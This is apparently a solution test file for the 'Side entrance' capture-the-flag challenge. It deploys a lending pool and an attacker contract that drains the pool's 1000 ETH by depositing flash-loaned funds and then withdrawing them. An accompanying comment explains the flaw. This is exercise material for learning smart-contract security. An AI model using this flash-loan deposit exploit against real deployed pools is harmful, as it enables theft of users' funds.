const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    it('Exploit', async function () {
        /** EXPLOIT
            The contract enables its user to deposit the ETH loaned, effectively transferring any fund deposited by the other users into an attacker's owned contract.
            The contract can then be emptied to retrieve the ETH.
        */
        const AttackerContractFactory = await ethers.getContractFactory('SideEntranceExploit', attacker);
        this.attackerContract = await AttackerContractFactory.deploy(attacker.address, this.pool.address);
        await this.attackerContract.exploit(ETHER_IN_POOL);

        expect(
            await ethers.provider.getBalance(this.attackerContract.address)
        ).to.equal(ETHER_IN_POOL); // Attacker's contract should be full with the pool balance

        this.attackerContract.sweep(); // Transfer the ETH to attacker's wallet
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
